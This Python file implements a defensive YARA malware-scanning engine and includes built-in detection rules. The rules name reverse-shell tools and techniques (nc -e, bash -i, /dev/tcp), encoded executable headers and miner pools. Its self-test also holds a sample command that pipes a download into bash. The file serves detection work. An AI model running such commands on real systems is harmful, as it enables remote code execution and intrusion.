"""
YARA Rule Engine for Deterministic Threat Detection

Provides YARA-based pattern matching for:
- File content scanning
- Memory pattern detection
- String/byte pattern matching
- Metadata extraction

YARA rules are deterministic - same input always produces same output.
All rule sources are tracked for auditability.
"""

import hashlib
import json
import logging
import os
import re
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Dict, List, Optional, Set, Any, Union, Callable

logger = logging.getLogger(__name__)

# Try to import yara-python
try:
    import yara
    YARA_AVAILABLE = True
except ImportError:
    YARA_AVAILABLE = False
    logger.warning("yara-python not available - YARA scanning disabled")


class RuleSeverity(Enum):
    """Severity levels for YARA rules."""
    INFO = "info"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


class RuleCategory(Enum):
    """Categories for YARA rules."""
    MALWARE = "malware"
    EXPLOIT = "exploit"
    BACKDOOR = "backdoor"
    RANSOMWARE = "ransomware"
    TROJAN = "trojan"
    WORM = "worm"
    PUP = "pup"  # Potentially Unwanted Program
    SUSPICIOUS = "suspicious"
    POLICY = "policy"
    CUSTOM = "custom"


@dataclass
class YARARule:
    """A single YARA rule."""
    name: str
    source: str  # YARA rule source code
    category: RuleCategory = RuleCategory.CUSTOM
    severity: RuleSeverity = RuleSeverity.MEDIUM
    description: str = ""
    author: str = ""
    reference: str = ""
    tags: List[str] = field(default_factory=list)

    # Metadata
    created_at: Optional[datetime] = None
    updated_at: Optional[datetime] = None
    hash: Optional[str] = None  # SHA256 of rule source

    # MITRE ATT&CK mapping
    mitre_techniques: List[str] = field(default_factory=list)

    def __post_init__(self):
        if self.hash is None:
            self.hash = hashlib.sha256(self.source.encode()).hexdigest()


@dataclass
class YARARuleSet:
    """A collection of YARA rules."""
    name: str
    rules: List[YARARule] = field(default_factory=list)
    source_path: Optional[str] = None

    # Signature verification
    signature: Optional[str] = None
    signed_by: Optional[str] = None

    # Metadata
    version: str = "1.0"
    created_at: Optional[datetime] = None

    @property
    def rule_count(self) -> int:
        return len(self.rules)

    def get_combined_source(self) -> str:
        """Get combined YARA source for all rules."""
        return "\n\n".join(rule.source for rule in self.rules)


@dataclass
class YARAMatch:
    """A match from a YARA rule."""
    rule_name: str
    rule_category: RuleCategory
    rule_severity: RuleSeverity

    # Match details
    strings_matched: List[Dict[str, Any]] = field(default_factory=list)
    tags: List[str] = field(default_factory=list)
    meta: Dict[str, Any] = field(default_factory=dict)

    # Location
    offset: Optional[int] = None
    length: Optional[int] = None


@dataclass
class YARAScanResult:
    """Result of a YARA scan."""
    target: str  # File path or identifier
    target_hash: Optional[str] = None
    scan_time: Optional[datetime] = None
    scan_duration_ms: float = 0.0

    # Matches
    matches: List[YARAMatch] = field(default_factory=list)

    # Status
    success: bool = True
    error: Optional[str] = None

    # Ruleset info
    ruleset_name: Optional[str] = None
    rules_checked: int = 0

    @property
    def has_matches(self) -> bool:
        return len(self.matches) > 0

    @property
    def highest_severity(self) -> Optional[RuleSeverity]:
        if not self.matches:
            return None
        severity_order = [
            RuleSeverity.CRITICAL,
            RuleSeverity.HIGH,
            RuleSeverity.MEDIUM,
            RuleSeverity.LOW,
            RuleSeverity.INFO,
        ]
        for sev in severity_order:
            if any(m.rule_severity == sev for m in self.matches):
                return sev
        return None


class YARAEngine:
    """
    YARA scanning engine.

    Usage:
        engine = YARAEngine()

        # Load rules
        engine.load_rules_from_file("/path/to/rules.yar")
        engine.add_rule(YARARule(name="test", source="rule test {...}"))

        # Scan
        result = engine.scan_file("/path/to/file")
        if result.has_matches:
            for match in result.matches:
                print(f"Matched: {match.rule_name}")
    """

    def __init__(self):
        self._lock = threading.Lock()
        self._rules: Dict[str, YARARule] = {}
        self._rulesets: Dict[str, YARARuleSet] = {}
        self._compiled_rules = None
        self._needs_recompile = True

        # Callbacks
        self._on_match: Optional[Callable[[YARAMatch], None]] = None

        # Stats
        self._scan_count = 0
        self._match_count = 0

    def add_rule(self, rule: YARARule) -> bool:
        """Add a single YARA rule."""
        with self._lock:
            self._rules[rule.name] = rule
            self._needs_recompile = True
            logger.debug(f"Added YARA rule: {rule.name}")
            return True

    def add_ruleset(self, ruleset: YARARuleSet) -> bool:
        """Add a ruleset."""
        with self._lock:
            self._rulesets[ruleset.name] = ruleset
            for rule in ruleset.rules:
                self._rules[rule.name] = rule
            self._needs_recompile = True
            logger.info(f"Added ruleset {ruleset.name} with {ruleset.rule_count} rules")
            return True

    def load_rules_from_file(self, path: str) -> bool:
        """Load YARA rules from a file."""
        if not YARA_AVAILABLE:
            logger.error("yara-python not available")
            return False

        try:
            with open(path, 'r') as f:
                source = f.read()

            # Parse rules from source
            # This is a simplified parser - real implementation would use yara-python
            ruleset = YARARuleSet(
                name=Path(path).stem,
                source_path=path,
                created_at=datetime.utcnow(),
            )

            # Extract rule names (simplified regex)
            rule_pattern = r'rule\s+(\w+)\s*(?:\:[\w\s]+)?\s*\{'
            for match in re.finditer(rule_pattern, source):
                rule_name = match.group(1)
                rule = YARARule(
                    name=rule_name,
                    source=source,  # Full source for now
                    created_at=datetime.utcnow(),
                )
                ruleset.rules.append(rule)

            return self.add_ruleset(ruleset)

        except Exception as e:
            logger.error(f"Failed to load rules from {path}: {e}")
            return False

    def load_rules_from_string(self, source: str, name: str = "inline") -> bool:
        """Load YARA rules from a string."""
        rule = YARARule(
            name=name,
            source=source,
            created_at=datetime.utcnow(),
        )
        return self.add_rule(rule)

    def _compile_rules(self) -> bool:
        """Compile all loaded rules."""
        if not YARA_AVAILABLE:
            return False

        with self._lock:
            if not self._needs_recompile:
                return True

            try:
                # Combine all rule sources
                combined_source = "\n\n".join(
                    rule.source for rule in self._rules.values()
                )

                if not combined_source.strip():
                    self._compiled_rules = None
                    self._needs_recompile = False
                    return True

                self._compiled_rules = yara.compile(source=combined_source)
                self._needs_recompile = False
                logger.info(f"Compiled {len(self._rules)} YARA rules")
                return True

            except yara.SyntaxError as e:
                logger.error(f"YARA syntax error: {e}")
                return False
            except Exception as e:
                logger.error(f"Failed to compile YARA rules: {e}")
                return False

    def scan_file(self, path: str, timeout: int = 60) -> YARAScanResult:
        """
        Scan a file with loaded YARA rules.

        Args:
            path: Path to file to scan
            timeout: Scan timeout in seconds

        Returns:
            YARAScanResult with any matches
        """
        start_time = time.time()
        result = YARAScanResult(
            target=path,
            scan_time=datetime.utcnow(),
            ruleset_name="combined",
            rules_checked=len(self._rules),
        )

        if not YARA_AVAILABLE:
            result.success = False
            result.error = "yara-python not available"
            return result

        if not os.path.exists(path):
            result.success = False
            result.error = f"File not found: {path}"
            return result

        # Compute file hash
        try:
            with open(path, 'rb') as f:
                result.target_hash = hashlib.sha256(f.read()).hexdigest()
        except Exception as e:
            result.error = f"Failed to hash file: {e}"

        # Compile rules if needed
        if not self._compile_rules():
            result.success = False
            result.error = "Failed to compile rules"
            return result

        if self._compiled_rules is None:
            # No rules loaded
            result.scan_duration_ms = (time.time() - start_time) * 1000
            return result

        try:
            matches = self._compiled_rules.match(path, timeout=timeout)

            for match in matches:
                yara_match = self._convert_match(match)
                result.matches.append(yara_match)

                # Callback
                if self._on_match:
                    self._on_match(yara_match)

            self._scan_count += 1
            self._match_count += len(matches)

        except yara.TimeoutError:
            result.success = False
            result.error = "Scan timed out"
        except Exception as e:
            result.success = False
            result.error = str(e)

        result.scan_duration_ms = (time.time() - start_time) * 1000
        return result

    def scan_data(self, data: bytes, identifier: str = "memory") -> YARAScanResult:
        """
        Scan in-memory data with loaded YARA rules.

        Args:
            data: Bytes to scan
            identifier: Identifier for the data

        Returns:
            YARAScanResult with any matches
        """
        start_time = time.time()
        result = YARAScanResult(
            target=identifier,
            target_hash=hashlib.sha256(data).hexdigest(),
            scan_time=datetime.utcnow(),
            ruleset_name="combined",
            rules_checked=len(self._rules),
        )

        if not YARA_AVAILABLE:
            result.success = False
            result.error = "yara-python not available"
            return result

        if not self._compile_rules():
            result.success = False
            result.error = "Failed to compile rules"
            return result

        if self._compiled_rules is None:
            result.scan_duration_ms = (time.time() - start_time) * 1000
            return result

        try:
            matches = self._compiled_rules.match(data=data)

            for match in matches:
                yara_match = self._convert_match(match)
                result.matches.append(yara_match)

                if self._on_match:
                    self._on_match(yara_match)

            self._scan_count += 1
            self._match_count += len(matches)

        except Exception as e:
            result.success = False
            result.error = str(e)

        result.scan_duration_ms = (time.time() - start_time) * 1000
        return result

    def _convert_match(self, match) -> YARAMatch:
        """Convert yara-python match to YARAMatch."""
        rule = self._rules.get(match.rule)

        strings_matched = []
        if hasattr(match, 'strings'):
            for string_match in match.strings:
                if hasattr(string_match, 'instances'):
                    for instance in string_match.instances:
                        strings_matched.append({
                            'identifier': string_match.identifier,
                            'offset': instance.offset,
                            'matched_data': instance.matched_data[:100],  # Limit size
                        })
                else:
                    strings_matched.append({
                        'identifier': str(string_match),
                    })

        return YARAMatch(
            rule_name=match.rule,
            rule_category=rule.category if rule else RuleCategory.CUSTOM,
            rule_severity=rule.severity if rule else RuleSeverity.MEDIUM,
            strings_matched=strings_matched,
            tags=list(match.tags) if hasattr(match, 'tags') else [],
            meta=dict(match.meta) if hasattr(match, 'meta') else {},
        )

    def set_match_callback(self, callback: Callable[[YARAMatch], None]) -> None:
        """Set callback for matches."""
        self._on_match = callback

    def get_stats(self) -> Dict[str, Any]:
        """Get scanning statistics."""
        return {
            'rules_loaded': len(self._rules),
            'rulesets_loaded': len(self._rulesets),
            'scans_performed': self._scan_count,
            'total_matches': self._match_count,
        }

    def clear_rules(self) -> None:
        """Clear all loaded rules."""
        with self._lock:
            self._rules.clear()
            self._rulesets.clear()
            self._compiled_rules = None
            self._needs_recompile = True


# Built-in rules for common threats
BUILTIN_RULES = """
rule SuspiciousShellCommand
{
    meta:
        description = "Detects suspicious shell command patterns"
        severity = "medium"
        category = "suspicious"

    strings:
        $cmd1 = "curl" ascii nocase
        $cmd2 = "wget" ascii nocase
        $cmd3 = "nc -e" ascii nocase
        $cmd4 = "bash -i" ascii nocase
        $cmd5 = "/dev/tcp/" ascii
        $pipe = "|" ascii
        $redirect = ">" ascii

    condition:
        ($cmd1 or $cmd2) and ($pipe or $redirect) and ($cmd3 or $cmd4 or $cmd5)
}

rule Base64EncodedPayload
{
    meta:
        description = "Detects base64 encoded executable patterns"
        severity = "high"
        category = "suspicious"

    strings:
        $b64_elf = "f0VMRg" ascii  // ELF header in base64
        $b64_pe = "TVqQAAM" ascii  // PE header in base64
        $b64_script = "IyEvYmlu" ascii  // #!/bin in base64

    condition:
        any of them
}

rule CryptoMinerIndicator
{
    meta:
        description = "Detects cryptocurrency miner indicators"
        severity = "medium"
        category = "pup"

    strings:
        $pool1 = "stratum+tcp://" ascii nocase
        $pool2 = "pool.minergate" ascii nocase
        $pool3 = "xmrpool" ascii nocase
        $wallet = /[a-zA-Z0-9]{95}/ ascii  // Monero wallet pattern

    condition:
        any of ($pool*) or $wallet
}
"""


if __name__ == '__main__':
    print("Testing YARA Engine...")

    engine = YARAEngine()

    # Add built-in rules
    if YARA_AVAILABLE:
        engine.load_rules_from_string(BUILTIN_RULES, "builtin")
        print(f"\nLoaded {len(engine._rules)} rules")

        # Test scan with sample data
        test_data = b"curl http://example.com | bash -i"
        result = engine.scan_data(test_data, "test_input")

        print(f"\nScan result:")
        print(f"  Target: {result.target}")
        print(f"  Success: {result.success}")
        print(f"  Duration: {result.scan_duration_ms:.2f}ms")
        print(f"  Matches: {len(result.matches)}")

        for match in result.matches:
            print(f"    - {match.rule_name} ({match.rule_severity.value})")

        print(f"\nStats: {engine.get_stats()}")
    else:
        print("\nyara-python not installed - skipping scan test")
        print("Install with: pip install yara-python")

    print("\nYARA engine test complete.")
